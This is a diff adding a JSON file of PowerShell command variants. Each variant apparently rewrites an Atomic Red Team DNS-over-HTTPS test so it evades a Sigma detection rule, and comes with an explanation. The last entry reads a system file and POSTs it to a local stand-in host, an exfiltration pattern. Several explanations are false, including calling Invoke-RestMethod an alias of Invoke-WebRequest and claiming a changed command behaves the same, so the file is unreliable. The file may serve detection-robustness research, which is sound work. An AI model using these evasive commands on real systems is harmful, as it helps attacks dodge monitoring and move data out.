@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe  -Command \"& { (Invoke-WebRequest -Uri https://[0x8.0x8.0x8.0x8]/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT).Content }\"",
+    "explanation": "The mutation technique used is recoding/encoding. The rule condition avoided is the direct IP address in the URL. The high-level behavior is expected to remain equivalent because the IP address is represented in a different format (hexadecimal) that is still parsed correctly by the PowerShell command."
+  },
+  {
+    "output": "powershell.exe -Command \"& { Invoke-RestMethod -Uri https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT }\"",
+    "explanation": "The mutation technique used is substitution. The rule condition avoided is the use of Invoke-WebRequest. The high-level behavior is expected to remain equivalent because Invoke-RestMethod is an alias for Invoke-WebRequest."
+  },
+  {
+    "output": "powershell.exe -Command \"& { (iwr https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT).Content }\"",
+    "explanation": "The mutation technique used is substitution. The rule condition avoided is the use of Invoke-WebRequest. The high-level behavior is expected to remain equivalent because 'iwr' is an alias for Invoke-WebRequest."
+  },
+  {
+    "output": "powershell.exe -Command \"& { (Invoke-WebRequest -Uri https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT -UseBasicParsing).Content }\"",
+    "explanation": "The mutation technique used is insertion. The rule condition avoided is the use of the '-UseBasicParsing' flag. However, this flag is not a condition in the Sigma rule, so this mutation does not actually avoid any rule condition. The high-level behavior is expected to remain equivalent because the '-UseBasicParsing' flag only affects the parsing of the response."
+  },
+  {
+    "output": "powershell.exe -Command \"& { $content = Get-Content C:\\\\Windows\\\\System32\\\\notepad.exe; Invoke-WebRequest -Uri http://[127.0.0.1] -Method POST -Body $content }\"",
+    "explanation": "The mutation technique used is recoding/encoding. The rule condition avoided is the direct IP address in the URL. The high-level behavior is expected to remain equivalent because the IP address is represented in a different format (square brackets) that is still parsed correctly by the PowerShell command."
+  }
+]
